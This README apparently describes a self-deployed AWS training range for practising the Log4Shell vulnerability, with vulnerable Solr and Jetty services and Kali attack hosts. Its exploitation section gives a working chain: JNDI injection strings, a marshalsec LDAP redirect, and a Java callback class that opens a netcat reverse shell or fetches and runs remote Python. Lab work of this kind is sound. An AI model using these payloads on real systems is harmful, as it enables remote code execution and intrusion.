# Wat?

This is a very small cloud hosted range for experimenting with the Log4Shell vulnerability.  It can automatically deploy the range to your AWS account, and configure it to contain:

* Vulnerable services
* Attack hosts (Kali)
* A Guacamole server simplifying interaction with the range

People connecting to your range will need nothing more than a webbrowser.  You will need Terraform and Ansible to deploy the range.

# Deploying the Range

First, deploy the infrastructure.  Check out `terraform/README.md`.

Then, configure it.  Check out `ansible/README.md`.

## Important Note About Multiple Deployments

The Guac server gets a LetsEncrypt certificate, and there are rate limits on certificates...  https://letsencrypt.org/docs/rate-limits/  For instance if you deploy the range, then destroy it, five times, you've used your allocation for a week for the domain name you're using.

# Connecting to the Range

A Guacamole server will be available at the domain you setup when deploying the infrastructure.  It'll even have a nice Let's Encrypt cert, so hit it at https.

Alternatively, you can SSH into the hosts.  If you're in the ansible directory you can run something like the following to SSH to them through the jump host:

`eval $(../scripts/get_ssh_cmd.py "kali_host_01")`

That host name comes from the Ansible hosts file - the `get_ssh_cmd.py` builds an SSH command based on the host info...

![Network Map](log4j_range_diagram.png)

# Vulnerable Services

After deploying the range and connecting, you'll have a couple vulnerable services at your disposal.

## Solr

`http://{solr-addr}:8983/solr/admin/cores?anything=${jndi...}`

`http://{solr-addr}:8983/solr/admin/configs?anything=${jndi...}`

`http://{solr-addr}:8983/solr/admin/collections?anything=${jndi...}`

This project uses Solr version 8.8.0 from Docker Hub.  The version of Java is new enough that it requires a system property be misconfigured to work...  It needs `com.sun.jndi.ldap.object.trustURLCodebase=true`.

## Jetty

`http://{solr-addr}/?q=${jndi...}`

`curl -H "User-Agent: ${jndi...}"`

This project uses the vulnerable Jetty server included via [this project](https://github.com/kc0bfv/vulnerableJettyLog4Shell)

# Exploiting Log4J

The Kali box's Desktop README has some tips in it, and the address of the vulnerable server.  First, you'll want to nmap it to make sure you understand what you're going after.  Then you might hit the services in your browser to learn a little more...  After that, setup a callback server and send the exploit.

# Setting up a Callback Server

First - thank you to SANS who I stole this from.  https://gist.github.com/joswr1ght/fb361f1f1e58307048aae5c0f38701e4

From a kali box:

```
cd marshalsec
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://{kali_box_ip}:8080/#Log4JCallback"
```

From that kali box in a separate terminal:

```
python -m http.server 8080
```

Separately, on that kali box, in the same directory your webserver is now running in, drop this code into Log4JCallback.java:

```
public class Log4JCallback {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc {kali_box_ip} 8081 -e /bin/bash");
        } catch (Exception err) {
            err.printStackTrace();
        }
    }
}
```

Now compile that with `javac Log4JCallback.java`, and setup a netcat listener as mentioned in your code:

```
nc -v -l -p 8081
```

Now you've got three listeners setup.  Next you're going to send the message to the vulnerable server - the format is: `${jndi:ldap://{kali_box_ip}:1389/Log4JCallback}`.  The vulnerable server is going to log that jndi string, and Log4J is going to parse it and visit the ldap server on your Kali box at port 1389.  There it will find the marshalsec LDAP server, which will tell it to look for a Java class at a remote location, specifically your Kali box on port 8080.  The class will be requested from your Python webserver on port 8080, and will get executed on load.  That will run the "exec nc" code, calling back with a shell to your listener on port 8081.  You'll see the connections come in - with the last on your netcat port 8081 listener, and that last will be your remote shell.

You can also call back to a metasploit `web_delivery` handler by using a Log4JCallback that runs something like: `java.lang.Runtime.getRuntime().exec(new String[] {"python3", "-c", "import urllib.request; exec(urllib.request.urlopen('http://{kali_box_ip}:8080/{MSFending}').read())"});`

# Improvements Needed

For defense:

1. Blue team routing is too tied in with the red team.  They are both in the same VPC so the subnets default to allowing all connections to/from everywhere...  Putting blue and red in separate VPCs with peering rules between them might allow a more real-world division.
2. Blue team needs a security onion box so they can monitor what's going on.  This may require a specific routing device in the infrastructure too.  The security onion monitoring can get attached to capture all the info headed to a routing device interface.
3. I have no idea how this meets or fails to meet security standards that might be required at my workplace.
